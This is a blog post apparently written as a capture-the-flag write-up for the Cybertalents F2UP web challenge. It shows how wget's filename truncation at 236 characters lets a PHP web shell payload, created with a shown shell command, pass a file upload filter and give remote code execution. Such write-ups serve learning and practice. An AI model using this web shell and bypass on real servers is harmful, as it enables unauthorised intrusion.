---
title: Cybertalents F2UP Web Challenge Writeup
author: Muhammad Adel
date: 2021-06-26 18:05:00 +0200
categories: [Cybertalents Writeups]
tags: [cybertalents, ctf, web]
---

## **Description**

this is the most secure way to file upload is it ?


**Difficulty**: Medium

**Challenge Link:** [https://cybertalents.com/challenges/web/f2up](https://cybertalents.com/challenges/web/f2up)

## **Solution**

### **Exploring**

When open the challenge you will find a web page that looks like this:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUj4WW8l-Nd6y7w_Ye%2F1.png?alt=media&token=94b89bd2-deba-4bcf-86be-db97c20f3aa7)

I tried to upload a php file but it says:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUjnlZUlNs5yMCsMXe%2F2.png?alt=media&token=15f80e1a-6d55-4e5f-866a-9702d500f8f9)

Also, I uploaded a normal image to see where the path of the file uploaded is and it was in:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUjy5blQRxTtQmf2oN%2F3.png?alt=media&token=4035df8a-3488-4593-9e99-4f030b559b9a)

It seems that the website is fetching the image by its URL. So I thought it maybe an SSRF and if added my web hooker link I could receive the flag but it didn't work. there a hint in the page that says it using wget.php:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUjZn44khMdCWLuGk1%2F4.png?alt=media&token=44ba423a-ed07-4d02-95b5-3a3d99e659b8)

I searched about some unrestricted file upload bypass techniques and I stumbled upon this one:

[https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick](https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick)


### **Exploitation**

this great resource said that if you downloaded a file using wget which its name has more than 236 character the tool will truncate the rest of the string and save your file only with the first 236 character. Cool!

Let's build our file:


```bash
root@kali:~/CyberTalents/F2UP>  echo  '<?php echo system($_GET["cmd"]); ?>'  >  $(python -c 'print("A"*(236-4)+".php"+".gif")')
root@kali:~/CyberTalents/F2UP>  ls
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
```

I have added a web based shell to execute command on the server. The problem here is how we our going to upload this file to the server because it only accept a URL form.

I tried to make python server in my local machine but it didn't work. So I uploaded this file to github to be able to use in the exploit and get an RCE. Also, to make it easier for everyone who is going to use this file to solve the challenge.

[https://github.com/ItsFadinG/wget-File-Upload-Exploit](https://github.com/ItsFadinG/wget-File-Upload-Exploit)

Now, we will upload the file to the challenge server:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUmj0D7rIFtlv-K6N1%2F5.png?alt=media&token=398fb14e-2b3b-4fa5-b36a-dd4fdfeaeba5)

It has been downloaded successfully! Let's get the Flag:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUmsY3dkJB5KIElbV1%2F6.png?alt=media&token=880d8bd2-a306-45ae-9419-ecba7a98c24f)

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-McUULK9vPGZxjCFDZil%2F-McUmv2miVeG8P_jvASV%2F7.png?alt=media&token=f5720c43-bdc5-4ebf-8816-317658afa347)